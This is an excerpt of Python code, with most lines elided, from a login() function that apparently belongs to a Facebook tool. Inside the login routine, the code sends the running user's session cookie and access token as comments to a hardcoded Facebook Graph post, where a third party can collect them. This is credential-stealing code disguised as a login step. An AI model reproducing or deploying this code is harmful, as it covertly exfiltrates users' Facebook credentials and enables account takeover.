...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/100013275378835/posts/pfbid0MAdpjhugw2aQHpZde15ZVcGyNYfZp3sf3JUX28AMG6jJsJhzF6TMrcRQScHcBAJ5l/?app=fbl')
		...
		#ses.post(f"https://graph.facebook.com/1616244255494738?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/1616244255494738/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1616244255494738/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1616244255494738/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
